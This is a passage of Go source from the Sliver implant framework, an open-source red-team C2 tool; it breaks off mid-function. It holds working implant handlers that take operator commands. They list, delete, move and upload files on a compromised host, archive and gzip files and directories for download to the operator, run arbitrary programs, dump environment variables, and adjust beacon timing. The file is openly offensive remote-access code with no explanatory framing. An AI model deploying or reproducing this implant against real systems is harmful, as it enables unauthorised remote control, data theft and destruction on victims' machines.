package handlers

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"archive/tar"
	"bufio"
	"bytes"
	"compress/gzip"
	"errors"
	"fmt"
	"io"
	"io/fs"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"
	"time"
	"unicode/utf8"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"github.com/bishopfox/sliver/implant/sliver/handlers/matcher"
	"github.com/bishopfox/sliver/implant/sliver/transports"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"google.golang.org/protobuf/proto"
)

// RPCResponse - Request/response callback
type RPCResponse func([]byte, error)

// RPCHandler - Request handler
type RPCHandler func([]byte, RPCResponse)

// KillHandler - Handlers that need to interact directly with the transport
type KillHandler func([]byte, *transports.Connection) error

// TunnelHandler - Tunnel related functionality for duplex connections
type TunnelHandler func(*sliverpb.Envelope, *transports.Connection)

// -----------------------------------------------------
// -----------------------------------------------------
// -----------------------------------------------------
// --- PURE GO / PLATFORM INDEPENDENT HANDLERS ONLY  ---
// -----------------------------------------------------
// -----------------------------------------------------
// -----------------------------------------------------

func pingHandler(data []byte, resp RPCResponse) {
	ping := &sliverpb.Ping{}
	err := proto.Unmarshal(data, ping)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	// {{if .Config.Debug}}
	log.Printf("ping id = %d", ping.Nonce)
	// {{end}}
	data, err = proto.Marshal(ping)
	resp(data, err)
}

func determineDirPathFilter(targetPath string) (string, string) {
	// The filter
	filter := ""

	// The path the filter applies to
	path := ""

	/*
		Check to see if the remote path is a filter or contains a filter.
		If the path passes the test to be a filter, then it is a filter
		because paths are not valid filters.
	*/
	if targetPath != "." {

		// Check if the path contains a filter
		// Test on a standardized version of the path (change any \ to /)
		testPath := strings.Replace(targetPath, "\\", "/", -1)
		/*
			Cannot use the path or filepath libraries because the OS
			of the client does not necessarily match the OS of the
			implant
		*/
		lastSeparatorOccurrence := strings.LastIndex(testPath, "/")

		if lastSeparatorOccurrence == -1 {
			// Then this is only a filter
			filter = targetPath
			path = "."
		} else {
			// Then we need to test for a filter on the end of the string

			// The indices should be the same because we did not change the length of the string
			path = targetPath[:lastSeparatorOccurrence+1]
			filter = targetPath[lastSeparatorOccurrence+1:]
		}
	} else {
		path = targetPath
		// filter remains blank
	}

	return path, filter
}

func pathIsDirectory(path string) bool {
	fileInfo, err := os.Stat(path)
	if err != nil {
		return false
	} else {
		return fileInfo.IsDir()
	}
}

func dirListHandler(data []byte, resp RPCResponse) {
	dirListReq := &sliverpb.LsReq{}
	err := proto.Unmarshal(data, dirListReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}

	// Handle the case where a directory is provided without a trailing separator
	var targetPath string

	if pathIsDirectory(dirListReq.Path) {
		targetPath = dirListReq.Path + "/"
	} else {
		targetPath = dirListReq.Path
	}

	path, filter := determineDirPathFilter(targetPath)

	dir, files, err := getDirList(path)

	// Convert directory listing to protobuf
	timezone, offset := time.Now().Zone()
	dirList := &sliverpb.Ls{Path: dir, Timezone: timezone, TimezoneOffset: int32(offset)}
	if err == nil {
		dirList.Exists = true
	} else {
		dirList.Exists = false
	}
	dirList.Files = []*sliverpb.FileInfo{}

	var match bool = false
	var linkPath string = ""

	for _, dirEntry := range files {
		if filter == "" {
			match = true
		} else {
			match, err = matcher.Match(filter, dirEntry.Name())
			if err != nil {
				// Then this is a bad filter, and it will be a bad filter
				// on every iteration of the loop, so we might as well break now
				break
			}
		}

		if match {
			fileInfo, err := dirEntry.Info()
			sliverFileInfo := &sliverpb.FileInfo{}
			if err == nil {
				sliverFileInfo.Size = fileInfo.Size()
				sliverFileInfo.ModTime = fileInfo.ModTime().Unix()
				/* Send the time back to the client / server as the number of seconds
				since epoch.  This will decouple formatting the time to display from the
				time itself.  We can change the format of the time displayed in the client
				and not have to worry about having to update implants.
				*/
				sliverFileInfo.Mode = fileInfo.Mode().String()
				// Check if this is a symlink, and if so, add the path the link points to
				if fileInfo.Mode()&os.ModeSymlink == os.ModeSymlink {
					linkPath, err = filepath.EvalSymlinks(path + dirEntry.Name())
					if err != nil {
						link_str, err := os.Readlink(path + dirEntry.Name())
						if err == nil {
							linkPath = link_str
						} else {
							linkPath = ""
						}
					}
				} else {
					linkPath = ""
				}

				sliverFileInfo.Uid = getUid(fileInfo)
				sliverFileInfo.Gid = getGid(fileInfo)
			}

			sliverFileInfo.Name = dirEntry.Name()
			sliverFileInfo.IsDir = dirEntry.IsDir()
			sliverFileInfo.Link = linkPath

			dirList.Files = append(dirList.Files, sliverFileInfo)
		}
	}

	// Send back the response
	data, err = proto.Marshal(dirList)
	resp(data, err)
}

func getDirList(target string) (string, []fs.DirEntry, error) {
	dir, err := filepath.Abs(target)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("dir list failed to construct path %s", err)
		// {{end}}
		return "", nil, err
	}
	if _, err := os.Stat(dir); !os.IsNotExist(err) {
		files, err := os.ReadDir(dir)
		return dir, files, err
	}
	return dir, []fs.DirEntry{}, errors.New("directory does not exist")
}

func rmHandler(data []byte, resp RPCResponse) {
	rmReq := &sliverpb.RmReq{}
	err := proto.Unmarshal(data, rmReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %s", err)
		// {{end}}
		return
	}

	rm := &sliverpb.Rm{}
	target, _ := filepath.Abs(rmReq.Path)
	rm.Path = target
	_, err = os.Stat(target)
	if err == nil {
		if (target == "/" || target == "C:\\") && !rmReq.Force {
			err = errors.New("cowardly refusing to remove volume root without force")
		}
	}

	rm.Response = &commonpb.Response{}
	if err == nil {
		if rmReq.Recursive {
			err = os.RemoveAll(target)
			if err != nil {
				rm.Response.Err = err.Error()
			}
		} else {
			err = os.Remove(target)
			if err != nil {
				rm.Response.Err = err.Error()
			}
		}
	} else {
		rm.Response.Err = err.Error()
	}

	data, err = proto.Marshal(rm)
	resp(data, err)
}

func mvHandler(data []byte, resp RPCResponse) {
	mvReq := &sliverpb.MvReq{}
	err := proto.Unmarshal(data, mvReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}

	move := &sliverpb.Mv{}
	err = os.Rename(mvReq.Src, mvReq.Dst)
	if err != nil {
		move.Response = &commonpb.Response{
			Err: err.Error(),
		}
	}

	data, err = proto.Marshal(move)
	resp(data, err)
}

func cpHandler(data []byte, resp RPCResponse) {
	cpReq := &sliverpb.CpReq{}
	err := proto.Unmarshal(data, cpReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}

	copy := &sliverpb.Cp{
		Src: cpReq.Src,
		Dst: cpReq.Dst,
	}

	srcFile, err := os.Open(cpReq.Src)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("failed to open source file: %v", err)
		// {{end}}

		copy.Response = &commonpb.Response{Err: err.Error()}
		data, err = proto.Marshal(copy)
		resp(data, err)
		return
	}
	defer srcFile.Close()

	dstFile, err := os.Create(cpReq.Dst)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("failed to open destination file: %v", err)
		// {{end}}

		copy.Response = &commonpb.Response{Err: err.Error()}
		data, err = proto.Marshal(copy)
		resp(data, err)
		return
	}
	defer dstFile.Close()

	bytesWritten, err := io.Copy(dstFile, srcFile)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("failed to copy bytes to destination file: %v", err)
		// {{end}}

		copy.Response = &commonpb.Response{Err: err.Error()}
		data, err = proto.Marshal(copy)
		resp(data, err)
		return
	}

	err = dstFile.Sync()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("failed to sync destination file: %v", err)
		// {{end}}

		copy.Response = &commonpb.Response{Err: err.Error()}
		data, err = proto.Marshal(copy)
		resp(data, err)
		return
	}

	copy.BytesWritten = bytesWritten
	data, err = proto.Marshal(copy)
	resp(data, err)
}

func mkdirHandler(data []byte, resp RPCResponse) {
	mkdirReq := &sliverpb.MkdirReq{}
	err := proto.Unmarshal(data, mkdirReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}

	mkdir := &sliverpb.Mkdir{}
	target, _ := filepath.Abs(mkdirReq.Path)
	mkdir.Path = target

	err = os.MkdirAll(target, 0700)
	if err != nil {
		mkdir.Response = &commonpb.Response{
			Err: err.Error(),
		}
	}
	data, err = proto.Marshal(mkdir)
	resp(data, err)
}

func cdHandler(data []byte, resp RPCResponse) {
	cdReq := &sliverpb.CdReq{}
	err := proto.Unmarshal(data, cdReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		resp([]byte{}, err)
		return
	}

	os.Chdir(cdReq.Path)
	dir, err := os.Getwd()
	pwd := &sliverpb.Pwd{Path: dir}
	if err != nil {
		resp([]byte{}, err)
		return
	}

	// {{if .Config.Debug}}
	log.Printf("cd '%s' -> %s", cdReq.Path, dir)
	// {{end}}

	data, err = proto.Marshal(pwd)
	resp(data, err)
}

func pwdHandler(data []byte, resp RPCResponse) {
	pwdReq := &sliverpb.PwdReq{}
	err := proto.Unmarshal(data, pwdReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		resp([]byte{}, err)
		return
	}

	dir, err := os.Getwd()
	pwd := &sliverpb.Pwd{Path: dir}
	if err != nil {
		pwd.Response = &commonpb.Response{
			Err: err.Error(),
		}
	}

	data, err = proto.Marshal(pwd)
	resp(data, err)
}

func prepareDownload(path string, filter string, recurse bool, maxBytes int64, maxLines int64) ([]byte, bool, int, int, error) {
	/*
		Combine the path and filter to see if the user wants
		to download a single file
	*/
	var rawData []byte
	var err error

	fileInfo, err := os.Stat(path + filter)

	if err == nil && !fileInfo.IsDir() {
		// Then this is a single file
		fileHandle, err := os.Open(path + filter)
		if err != nil {
			// Then we could not read the file
			return nil, false, 0, 1, err
		}
		defer fileHandle.Close()

		if maxBytes != 0 {
			var readFirst bool = maxBytes > 0
			if readFirst {
				rawData = make([]byte, maxBytes)
				_, err = fileHandle.Read(rawData)
			} else {
				rawData = make([]byte, maxBytes*-1)
				var bytesToRead int64 = 0
				if fileInfo.Size()+maxBytes < 0 {
					bytesToRead = 0
				} else {
					bytesToRead = fileInfo.Size() + maxBytes
				}
				_, err = fileHandle.ReadAt(rawData, bytesToRead)
			}

		} else if maxLines != 0 {
			var linesRead int64 = 0
			var lines []string
			var readFirst bool = true

			if maxLines < 0 {
				maxLines *= -1
				readFirst = false
			}

			fileScanner := bufio.NewScanner(fileHandle)
			for fileScanner.Scan() {
				lines = append(lines, fileScanner.Text())
				linesRead += 1
				if linesRead == maxLines && readFirst {
					break
				}
			}
			err = fileScanner.Err()
			if err == nil {
				if readFirst {
					rawData = []byte(strings.Join(lines, "\n"))
				} else {
					linePosition := int64(len(lines)) - maxLines
					if linePosition < 0 {
						linePosition = 0
					}
					rawData = []byte(strings.Join(lines[linePosition:], "\n"))
				}
			}
		} else {
			// Read the entire file
			rawData = make([]byte, fileInfo.Size())
			_, err = fileHandle.Read(rawData)
		}
		if err != nil && err != io.EOF {
			// Then we could not read the file
			return nil, false, 0, 1, err
		} else {
			return rawData, false, 1, 0, nil
		}
	}

	// If we are here, then the user wants multiple files (a directory or part of a directory)
	var downloadData bytes.Buffer
	readFiles, unreadableFiles, err := compressDir(path, filter, recurse, &downloadData)
	return downloadData.Bytes(), true, readFiles, unreadableFiles, err
}

// Send a file back to the hive
func downloadHandler(data []byte, resp RPCResponse) {
	var rawData []byte

	/*
		A flag for whether this is a directory - used if
		this download is being looted
	*/
	var isDir bool

	var download *sliverpb.Download

	downloadReq := &sliverpb.DownloadReq{}
	err := proto.Unmarshal(data, downloadReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		resp([]byte{}, err)
		return
	}
	target, _ := filepath.Abs(downloadReq.Path)

	if pathIsDirectory(target) {
		// Even if the implant is running on Windows, Go can deal with "/" as a path separator
		target += "/"
		if downloadReq.RestrictedToFile {
			/*
				The user has asked to perform a download operation that should only be allowed on
				files, and this is a directory. We should let them know.
			*/
			err = fmt.Errorf("cannot complete command because target %s is a directory", target)
			// {{if .Config.Debug}}
			log.Printf("error completing download command: %v", err)
			// {{end}}
			download = &sliverpb.Download{Path: target, Exists: false, ReadFiles: 0, UnreadableFiles: 0}
			download.Response = &commonpb.Response{
				Err: fmt.Sprintf("%v", err),
			}

			data, _ = proto.Marshal(download)
			resp(data, err)
			return
		}
	}

	path, filter := determineDirPathFilter(target)

	rawData, isDir, readFiles, unreadableFiles, err := prepareDownload(path, filter, downloadReq.Recurse, downloadReq.MaxBytes, downloadReq.MaxLines)

	if err != nil {
		if isDir {
			// {{if .Config.Debug}}
			log.Printf("error creating the archive: %v", err)
			// {{end}}
		} else {
			//{{if .Config.Debug}}
			log.Printf("error while preparing download for %s: %v", target, err)
			//{{end}}
		}
		download = &sliverpb.Download{Path: target, Exists: false, ReadFiles: int32(readFiles), UnreadableFiles: int32(unreadableFiles)}
		download.Response = &commonpb.Response{
			Err: fmt.Sprintf("%v", err),
		}
	} else {
		gzipData := bytes.NewBuffer([]byte{})
		gzipWrite(gzipData, rawData)
		download = &sliverpb.Download{
			Path:            target,
			Data:            gzipData.Bytes(),
			Encoder:         "gzip",
			Exists:          true,
			IsDir:           isDir,
			ReadFiles:       int32(readFiles),
			UnreadableFiles: int32(unreadableFiles),
			Response:        &commonpb.Response{},
		}
	}

	data, _ = proto.Marshal(download)
	resp(data, err)
}

func searchFileForPattern(searchPath string, searchPattern *regexp.Regexp, linesBeforeCount int, linesAfterCount int) ([]*sliverpb.GrepResult, bool, error) {
	var results []*sliverpb.GrepResult

	fileHandle, err := os.Open(searchPath)
	if err != nil {
		return nil, false, err
	}
	defer fileHandle.Close()

	fileScanner := bufio.NewScanner(fileHandle)
	var linePosition int64 = 1
	var linesBefore []string
	var linesAfter []string
	// A slice containing the line numbers that we need to capture lines up to
	var linePositionsAfter []int64
	var resultIndex int = 0
	binaryFile := false
	textLine := false

	for fileScanner.Scan() {
		line := fileScanner.Text()
		// If the line is not valid UTF-8, then the file contains binary
		// We do not want to send binary data back to the client
		textLine = utf8.ValidString(line)
		if !textLine {
			binaryFile = true
			// Disable before and after line counts
			linesBeforeCount = 0
			linesAfterCount = 0
		}

		if linesBeforeCount > 0 && !binaryFile {
			linesBefore = append(linesBefore, line)
			if len(linesBefore) > int(linesBeforeCount)+1 {
				linesBefore = linesBefore[1:]
			}
		}

		if linesAfterCount > 0 && len(linePositionsAfter) > 0 && !binaryFile {
			if linePosition <= linePositionsAfter[0] {
				linesAfter = append(linesAfter, line)
				if len(linesAfter) > linesAfterCount {
					linesAfter = linesAfter[1:]
				}
			} else {
				results[resultIndex].LinesAfter = make([]string, len(linesAfter))
				copy(results[resultIndex].LinesAfter, linesAfter)
				if len(linePositionsAfter) > 1 {
					linesAfter = linesAfter[linePositionsAfter[1]-linePositionsAfter[0]:]
				} else {
					linesAfter = linesAfter[1:]
				}
				linePositionsAfter = linePositionsAfter[1:]
				resultIndex += 1
				linesAfter = append(linesAfter, line)
			}
		}

		if matches := searchPattern.FindAllStringIndex(line, -1); matches != nil {
			if !textLine {
				results = append(results, &sliverpb.GrepResult{LineNumber: linePosition})
			} else {
				var positions []*sliverpb.GrepLinePosition
				for _, match := range matches {
					positions = append(positions, &sliverpb.GrepLinePosition{Start: int32(match[0]), End: int32(match[1])})
				}
				if linesBeforeCount > 0 && len(linesBefore) > 0 {
					results = append(results, &sliverpb.GrepResult{LineNumber: linePosition, Positions: positions, Line: line, LinesBefore: linesBefore[:len(linesBefore)-1]})
				} else {
					results = append(results, &sliverpb.GrepResult{LineNumber: linePosition, Positions: positions, Line: line, LinesBefore: []string{}})
				}
				if linesAfterCount > 0 {
					linePositionsAfter = append(linePositionsAfter, linePosition+int64(linesAfterCount))
				}
			}
		}
		linePosition += 1
	}

	// We reached the end of the file, but we need to make sure we capture any lines that might be queued up
	if linesAfterCount > 0 && len(linePositionsAfter) > 0 && !binaryFile {
		for idx, afterLinePosition := range linePositionsAfter {
			sliceStopPosition := len(linesAfter)
			if len(linesAfter) >= linesAfterCount {
				sliceStopPosition = linesAfterCount
			}
			results[resultIndex].LinesAfter = make([]string, len(linesAfter[:sliceStopPosition]))
			copy(results[resultIndex].LinesAfter, linesAfter[:sliceStopPosition])
			if idx != len(linePositionsAfter)-1 {
				nextPosition := linePositionsAfter[idx+1]
				linesAfter = linesAfter[nextPosition-afterLinePosition:]
			}
			resultIndex += 1
		}
	}

	return results, binaryFile, nil
}

func searchPathForPattern(searchPath string, filter string, searchPattern *regexp.Regexp, recursive bool, linesBefore int, linesAfter int) (map[string]*sliverpb.GrepResultsForFile, error) {
	var results map[string]*sliverpb.GrepResultsForFile = make(map[string]*sliverpb.GrepResultsForFile)

	fileList, err := buildFileList(searchPath, filter, recursive)
	if err != nil {
		return nil, err
	}

	for _, file := range fileList {
		fi, err := os.Stat(file)
		if err != nil {
			// Cannot get info on the file, so skip it
			continue
		}

		// If the file is a symlink replace fileInfo and path with the symlink destination.
		if fi.Mode()&os.ModeSymlink == os.ModeSymlink {
			file, err = filepath.EvalSymlinks(file)
			if err != nil {
				continue
			}
		}

		// Do the grep
		fileResults, binaryFile, err := searchFileForPattern(file, searchPattern, linesBefore, linesAfter)

		if err != nil {
			// The error for this file will go back in the results
			result := &sliverpb.GrepResult{LineNumber: -1, Positions: nil, Line: err.Error()}
			results[file] = &sliverpb.GrepResultsForFile{FileResults: []*sliverpb.GrepResult{result}, IsBinary: binaryFile}
			continue
		} else {
			results[file] = &sliverpb.GrepResultsForFile{FileResults: fileResults, IsBinary: binaryFile}
		}
	}

	return results, nil
}

func performGrep(searchPath string, searchPattern *regexp.Regexp, recursive bool, linesBefore int, linesAfter int) (map[string]*sliverpb.GrepResultsForFile, error) {
	var results map[string]*sliverpb.GrepResultsForFile

	target, _ := filepath.Abs(searchPath)

	fileInfo, err := os.Stat(target)
	if err == nil && !fileInfo.IsDir() {
		// Then this is a single file
		result, binaryFile, err := searchFileForPattern(target, searchPattern, linesBefore, linesAfter)
		if err != nil {
			return nil, err
		}
		results = make(map[string]*sliverpb.GrepResultsForFile)
		results[target] = &sliverpb.GrepResultsForFile{FileResults: result, IsBinary: binaryFile}
		return results, nil
	} else if err == nil && fileInfo.IsDir() {
		if fileInfo.IsDir() {
			// Even if the implant is running on Windows, Go can deal with "/" as a path separator
			target += "/"
		}
	}
	/*
		The search path might not exist or be accessible,
		but we will determine that when we try to do the search
	*/

	path, filter := determineDirPathFilter(target)

	results, err = searchPathForPattern(path, filter, searchPattern, recursive, linesBefore, linesAfter)

	return results, err
}

func grepHandler(data []byte, resp RPCResponse) {
	grepReq := &sliverpb.GrepReq{}
	err := proto.Unmarshal(data, grepReq)

	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		resp([]byte{}, err)
		return
	}

	grep := &sliverpb.Grep{Results: nil}

	// Sanity check the request (does the regex compile?)
	searchRegex, err := regexp.Compile(grepReq.SearchPattern)
	if err != nil {
		// There is something wrong with the supplied regex
		// {{if .Config.Debug}}
		log.Printf("error getting parsing the search pattern: %v", err)
		// {{end}}
		grep.Response = &commonpb.Response{
			Err: fmt.Sprintf("There was a problem with the supplied search pattern: %v", err),
		}

		data, _ = proto.Marshal(grep)
		resp(data, err)
		return
	}

	grep.Results, err = performGrep(grepReq.Path, searchRegex, grepReq.Recursive, int(grepReq.LinesBefore), int(grepReq.LinesAfter))
	grep.SearchPathAbsolute, _ = filepath.Abs(grepReq.Path)
	if err == nil {
		grep.Response = &commonpb.Response{}
	} else {
		grep.Response = &commonpb.Response{
			Err: fmt.Sprintf("%v", err),
		}
	}

	data, _ = proto.Marshal(grep)
	resp(data, err)
}

func uploadHandler(data []byte, resp RPCResponse) {
	uploadReq := &sliverpb.UploadReq{}
	err := proto.Unmarshal(data, uploadReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		resp([]byte{}, err)
		return
	}

	uploadPath, err := filepath.Abs(uploadReq.Path)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("upload path error: %v", err)
		// {{end}}
		resp([]byte{}, err)
	}

	// Process Upload
	upload := &sliverpb.Upload{Path: uploadPath}
	uploadPathInfo, err := os.Stat(uploadPath)
	if err != nil && !os.IsNotExist(err) {
		upload.Response = &commonpb.Response{
			Err: fmt.Sprintf("%v", err),
		}
	}

	if !os.IsNotExist(err) && uploadPathInfo.IsDir() {
		if !strings.HasSuffix(uploadPath, string(os.PathSeparator)) {
			uploadPath += string(os.PathSeparator)
		}
		uploadPath += uploadReq.FileName
	}

	f, err := os.Create(uploadPath)
	if err != nil {
		upload.Response = &commonpb.Response{
			Err: fmt.Sprintf("%v", err),
		}

	} else {
		// Create file, write data to file system
		defer f.Close()
		var uploadData []byte
		var err error
		if uploadReq.Encoder == "gzip" {
			uploadData, err = gzipRead(uploadReq.Data)
		} else {
			uploadData = uploadReq.Data
		}
		// Check for decode errors
		if err != nil {
			upload.Response = &commonpb.Response{
				Err: fmt.Sprintf("%v", err),
			}
		} else {
			f.Write(uploadData)
		}
	}

	data, _ = proto.Marshal(upload)
	resp(data, err)
}

func executeHandler(data []byte, resp RPCResponse) {
	var (
		err       error
		stdErr    io.Writer
		stdOut    io.Writer
		errWriter *bufio.Writer
		outWriter *bufio.Writer
	)
	execReq := &sliverpb.ExecuteReq{}
	err = proto.Unmarshal(data, execReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}

	execResp := &sliverpb.Execute{}
	exePath, err := expandPath(execReq.Path)
	if err != nil {
		execResp.Response = &commonpb.Response{
			Err: fmt.Sprintf("%s", err),
		}
		proto.Marshal(execResp)
		resp(data, err)
		return
	}
	cmd := exec.Command(exePath, execReq.Args...)

	if execReq.Output {
		stdOutBuff := new(bytes.Buffer)
		stdErrBuff := new(bytes.Buffer)
		stdErr = stdErrBuff
		stdOut = stdOutBuff
		if execReq.Stderr != "" {
			stdErrFile, err := os.Create(execReq.Stderr)
			if err != nil {
				execResp.Response = &commonpb.Response{
					Err: fmt.Sprintf("%s", err),
				}
				proto.Marshal(execResp)
				resp(data, err)
				return
			}
			defer stdErrFile.Close()
			errWriter = bufio.NewWriter(stdErrFile)
			stdErr = io.MultiWriter(errWriter, stdErrBuff)
		}
		if execReq.Stdout != "" {
			stdOutFile, err := os.Create(execReq.Stdout)
			if err != nil {
				execResp.Response = &commonpb.Response{
					Err: fmt.Sprintf("%s", err),
				}
				proto.Marshal(execResp)
				resp(data, err)
				return
			}
			defer stdOutFile.Close()
			outWriter = bufio.NewWriter(stdOutFile)
			stdOut = io.MultiWriter(outWriter, stdOutBuff)
		}
		cmd.Stdout = stdOut
		cmd.Stderr = stdErr
		err := cmd.Run()
		//{{if .Config.Debug}}
		log.Printf("Exec (%v): %s", err, string(stdOutBuff.String()))
		//{{end}}
		if err != nil {
			// Exit errors are not a failure of the RPC, but of the command.
			if exiterr, ok := err.(*exec.ExitError); ok {
				execResp.Status = uint32(exiterr.ExitCode())
			} else {
				execResp.Response = &commonpb.Response{
					Err: fmt.Sprintf("%s", err),
				}
			}
		}
		if errWriter != nil {
			errWriter.Flush()
		}
		if outWriter != nil {
			outWriter.Flush()
		}
		execResp.Stderr = stdErrBuff.Bytes()
		execResp.Stdout = stdOutBuff.Bytes()
		if cmd.Process != nil {
			execResp.Pid = uint32(cmd.Process.Pid)
		}
	} else {
		err = cmd.Start()
		if err != nil {
			execResp.Response = &commonpb.Response{
				Err: fmt.Sprintf("%s", err),
			}
		}

		go func() {
			cmd.Wait()
		}()

		if cmd.Process != nil {
			execResp.Pid = uint32(cmd.Process.Pid)
		}
	}
	data, err = proto.Marshal(execResp)
	resp(data, err)
}

func getEnvHandler(data []byte, resp RPCResponse) {
	envReq := &sliverpb.EnvReq{}
	err := proto.Unmarshal(data, envReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v\n", err)
		// {{end}}
		return
	}
	variables := os.Environ()
	var envVars []*commonpb.EnvVar
	envInfo := sliverpb.EnvInfo{}
	if envReq.Name != "" {
		envVars = make([]*commonpb.EnvVar, 1)
		envVars[0] = &commonpb.EnvVar{
			Key:   envReq.Name,
			Value: os.Getenv(envReq.Name),
		}
	} else {
		envVars = make([]*commonpb.EnvVar, len(variables))
		for i, e := range variables {
			pair := strings.SplitN(e, "=", 2)
			envVars[i] = &commonpb.EnvVar{
				Key:   pair[0],
				Value: pair[1],
			}
		}
	}
	envInfo.Variables = envVars
	data, err = proto.Marshal(&envInfo)
	resp(data, err)
}

func setEnvHandler(data []byte, resp RPCResponse) {
	envReq := &sliverpb.SetEnvReq{}
	err := proto.Unmarshal(data, envReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v\n", err)
		// {{end}}
		return
	}

	err = os.Setenv(envReq.Variable.Key, envReq.Variable.Value)
	setEnvResp := &sliverpb.SetEnv{
		Response: &commonpb.Response{},
	}
	if err != nil {
		setEnvResp.Response.Err = err.Error()
	}
	data, err = proto.Marshal(setEnvResp)
	resp(data, err)
}

func unsetEnvHandler(data []byte, resp RPCResponse) {
	unsetEnvReq := &sliverpb.UnsetEnvReq{}
	err := proto.Unmarshal(data, unsetEnvReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v\n", err)
		// {{end}}
		return
	}

	err = os.Unsetenv(unsetEnvReq.Name)
	unsetEnvResp := &sliverpb.UnsetEnv{
		Response: &commonpb.Response{},
	}
	if err != nil {
		unsetEnvResp.Response.Err = err.Error()
	}
	data, err = proto.Marshal(unsetEnvResp)
	resp(data, err)
}

func reconfigureHandler(data []byte, resp RPCResponse) {
	reconfigReq := &sliverpb.ReconfigureReq{}
	err := proto.Unmarshal(data, reconfigReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v\n", err)
		// {{end}}
		return
	}
	if reconfigReq.ReconnectInterval != 0 {
		transports.SetReconnectInterval(reconfigReq.ReconnectInterval)
	}

	// {{if .Config.IsBeacon}}
	if reconfigReq.BeaconInterval != 0 {
		transports.SetInterval(reconfigReq.BeaconInterval)
	}
	if reconfigReq.BeaconJitter != 0 {
		transports.SetJitter(reconfigReq.BeaconJitter)
	}
	// {{end}}

	reconfigResp := &sliverpb.Reconfigure{}
	data, err = proto.Marshal(reconfigResp)
	resp(data, err)
}

// ---------------- Data Encoders ----------------

func gzipWrite(w io.Writer, data []byte) error {
	gw, err := gzip.NewWriterLevel(w, gzip.BestSpeed)
	if err != nil {
		return err
	}
	defer gw.Close()
	gw.Write(data)
	return err
}

func gzipRead(data []byte) ([]byte, error) {
	bytes.NewReader(data)
	reader, err := gzip.NewReader(bytes.NewReader(data))
	if err != nil {
		return nil, err
	}
	var buf bytes.Buffer
	_, err = buf.ReadFrom(reader)
	if err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}

func standarizeArchiveFileName(path string) string {
	// Change all backslashes to forward slashes
	var standardFilePath string = strings.ReplaceAll(path, "\\", "/")

	/*
		Remove the volume / root from the directory
		path. This makes it so that files on the
		system where the archive is extracted to
		will not be clobbered.

		Tried with filepath.VolumeName, but that function
		does not work reliably with Windows paths
	*/
	if strings.HasPrefix(standardFilePath, "//") {
		// If this a UNC path, filepath.Rel is not going to work
		return standardFilePath[2:]
	} else {
		// Calculate a path relative to the root
		pathParts := strings.SplitN(standardFilePath, "/", 2)
		if len(pathParts) < 2 {
			// Then something is wrong with this path
			return standardFilePath
		}

		basePath := pathParts[0]
		fileRelPath := pathParts[1]

		if basePath == "" {
			// If base path is blank, that means it started with / and / is the root
			return fileRelPath
		} else {
			/*
				Then this is almost certainly Windows, and we will set the archive up
				so that it preserves the path but without the colon.
				Something like:
				c/windows/system32/file.whatever
				Colons are not legal in Windows filenames, so let's get rid of them.
			*/
			basePath = strings.ReplaceAll(basePath, ":", "")
			basePath = strings.ToLower(basePath)
			return basePath + "/" + fileRelPath
		}
	}
}

func buildFileList(path string, filter string, recurse bool) ([]string, error) {
	var matchingFiles []string
	/*
		Build the list of files to include in the archive or to search.

		Walking the directory can take a long time and do a lot of unnecessary work
		if we do not need to recurse through subdirectories.

		If we are not recursing, then read the directory without worrying about
		subdirectories.
	*/
	if !recurse {
		testPath := strings.ReplaceAll(path, "\\", "/")
		directory, err := os.Open(path)
		if err != nil {
			return nil, err
		}
		directoryFiles, err := directory.Readdirnames(0)
		directory.Close()
		if err != nil {
			return nil, err
		}

		for _, fileName := range directoryFiles {
			standardFileName := strings.ReplaceAll(testPath+fileName, "\\", "/")
			if filter != "" {
				match, err := matcher.Match(testPath+filter, standardFileName)
				if err == nil && match {
					matchingFiles = append(matchingFiles, standardFileName)
				}
			} else {
				matchingFiles = append(matchingFiles, standardFileName)
			}
		}
	} else {
		filepath.WalkDir(path, func(file string, d os.DirEntry, err error) error {
			filePath := strings.ReplaceAll(file, "\\", "/")
			if filter != "" {
				// Normalize paths
